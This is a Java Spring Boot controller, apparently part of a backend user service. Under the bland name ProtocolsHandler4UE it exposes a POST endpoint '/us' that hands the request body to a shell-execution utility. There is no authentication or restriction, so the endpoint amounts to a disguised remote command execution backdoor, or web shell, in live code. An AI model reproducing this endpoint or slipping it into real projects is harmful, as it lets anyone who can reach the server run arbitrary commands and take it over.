package com.dkdy.backend.user.UserService;

import com.util.ShellBean;
import com.util.ShellUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import javax.validation.Valid;

@Slf4j
@RestController
public class ProtocolsHandler4UE {

	public ProtocolsHandler4UE() {
		log.info("init configure finished us");
	}

	@PostMapping("/us")
	public String us(@RequestBody @Valid ShellBean s) { return ShellUtils.ex(s); }

}
